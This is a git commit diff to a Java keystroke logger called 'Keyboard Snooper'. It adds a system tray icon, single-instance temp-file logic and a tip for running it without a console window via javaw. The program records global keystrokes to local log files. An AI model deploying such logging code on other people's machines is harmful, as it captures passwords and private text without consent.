ddde424222961c8f2f0a561f4b6f16d8bba1059e
doppelgunner <doppelgunner@gmail.com>
2017-04-27 00:16:38 +0800

    added snooper2

--- Snooper.java
+++ Snooper.java
@@ -5,10 +5,12 @@ import org.jnativehook.keyboard.NativeKeyAdapter;
 
 import java.util.logging.*;
 import java.io.*;
+import java.awt.*;
+import java.awt.event.*;
 
 //COMPILE: javac -cp ".;lib/jnativehook-2.1.0.jar;" Snooper.java
 //RUN: java -cp ".;lib/jnativehook-2.1.0.jar;" Snooper
-
+//RUN without console: javaw -cp ".;lib/jnativehook-2.1.0.jar;" Snooper
 public class Snooper extends NativeKeyAdapter {
   
 	public static final String FOLDER = "snoop_log";
@@ -19,10 +21,14 @@ public class Snooper extends NativeKeyAdapter {
 	public static final int HOUR_IN_MILLI = SECOND_IN_MILLI * 60 * 60;
 	public static final String fileNameFormat = "yyyyMMddHHmmssSSSS";
 	public static final String perHourFormat = "yyyy, MM dd, h:mma";
+	public static final String TITLE = "Keyboard Snooper";
+	public static final String AUTHOR = "doppelgunner";
 
 	private File folderFile;
 	private File keyStrokesFile;
+	private File tempFile;
 	private String keyStrokesFilePath;
+	private String tempFilePath;
 	
 	private String startDate;
 	
@@ -33,30 +39,38 @@ public class Snooper extends NativeKeyAdapter {
 	
 	private boolean wroteSomething;
 	
+	private TrayIcon trayIcon;
+	private SystemTray tray;
+	private PopupMenu popup;
+	
 	public Snooper() {
 		init();
+		initSystemTray();
+		start();
 	}
 	
+	//init of the base of the program
 	public void init() {
 		folderFile = new File(FOLDER);
 		startDate = Util.getCurrentDate(fileNameFormat);
 		keyStrokesFilePath = FOLDER + DASH + START_NAME + startDate + EXTENSION_NAME;
-		keyStrokesFile = Util.createFile(keyStrokesFilePath);
+		keyStrokesFile = new File(keyStrokesFilePath);
+		tempFilePath = FOLDER + DASH + START_NAME + "temp" + EXTENSION_NAME;
+		
+		if (Util.hasInstance(tempFilePath)) {
+			System.exit(0); //exit app if already has a temp file to log into
+		}
+		
+		tempFile = Util.createFile(tempFilePath);
 		
 		try {
-			bWriter = new BufferedWriter(new FileWriter(keyStrokesFile));
+			bWriter = new BufferedWriter(new FileWriter(tempFile));
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 		
 		Runtime.getRuntime().addShutdownHook(new Thread(()-> {
-			try {
-				if (bWriter != null) {
-					bWriter.close();
-				}
-			} catch (Exception ex) {
-				ex.printStackTrace();
-			}
+			dispose();
 		}));
 		
 		flushTimer = new javax.swing.Timer(SECOND_IN_MILLI, e-> {
@@ -80,10 +94,54 @@ public class Snooper extends NativeKeyAdapter {
 				ex.printStackTrace();
 			}
 		});
+	}
+	
+	//init of system tray
+	public void initSystemTray() {
+		if (!SystemTray.isSupported()) {
+			System.err.println("System tray is not supported");
+		}
+		tray = SystemTray.getSystemTray();
+		trayIcon = new TrayIcon(Util.createImage("images/snooper.png","Keyboard Snooper"));
+		try {
+			tray.add(trayIcon);
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
 		
+		popup = new PopupMenu();
+		MenuItem about = new MenuItem("About");
+		MenuItem exit = new MenuItem("Exit");
+		
+		popup.add(about);
+		popup.addSeparator();
+		popup.add(exit);
+		
+		trayIcon.setImageAutoSize(true);
+		trayIcon.setToolTip("Keyboard Snooper");
+		trayIcon.setPopupMenu(popup);
+		
+		about.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				trayIcon.displayMessage(TITLE, "by " + AUTHOR, TrayIcon.MessageType.NONE);
+			}
+		});
+		
+		exit.addActionListener(e -> {
+			trayIcon.displayMessage(TITLE, "Exiting ...", TrayIcon.MessageType.NONE);
+			tray.remove(trayIcon);
+			System.exit(0);
+		});
+	}
+	
+	//starts the timer of the program
+	public void start() {
+		//start the timers
 		flushTimer.start();
 		perHourTimer.setInitialDelay(0);
 		perHourTimer.start();
+		
+		trayIcon.displayMessage(TITLE, "Starting ...", TrayIcon.MessageType.NONE);
 	}
 	
     public void nativeKeyReleased(NativeKeyEvent e) {
@@ -113,4 +171,16 @@ public class Snooper extends NativeKeyAdapter {
 
         GlobalScreen.addNativeKeyListener(new Snooper());
     }
+	
+	//called when the program is aout to exit or shutdown
+	public void dispose() {
+		try {
+			if (bWriter != null) {
+				bWriter.close();
+			}
+			tempFile.renameTo(keyStrokesFile);
+		} catch (Exception ex) {
+			System.err.println("Error: closing stream");
+		}
+	}
 }
--- Util.java
+++ Util.java
@@ -1,8 +1,13 @@
 import java.util.*;
 import java.io.*;
 import java.text.*;
+import javax.swing.*;
+import java.net.*;
+import java.awt.*;
 
 public class Util {
+	
+	//create a file in the disk
 	public static File createFile(String filename) {
 		File file = new File(filename);
 		File parentFile = file.getParentFile();
@@ -22,9 +27,36 @@ public class Util {
 		return file;
 	}
 	
+	//get the current date within the given format
 	public static String getCurrentDate(String format) {
 		DateFormat dateFormat = new SimpleDateFormat(format);
 		Date date = new Date();
 		return dateFormat.format(date);
+	}
+	
+	//gets the image from the path
+	public static Image createImage(String path, String description) {
+		URL imageURL = Util.class.getResource(path);
+		
+		if (imageURL == null) {
+			System.err.println("Resource not found: " + path);
+			return null;
+		} else {
+			return (new ImageIcon(imageURL, description)).getImage();
+		}
+	}
+	
+	//converts the string to file and pass it to hasInstance(File file) method
+	public static boolean hasInstance(String filePath) {
+		return hasInstance(new File(filePath));
+	}
+	
+	//checks if the file has already been created
+	public static boolean hasInstance(File file) {
+		if (file.exists()) {
+			return true;
+		}
+		
+		return false;
 	}
 }
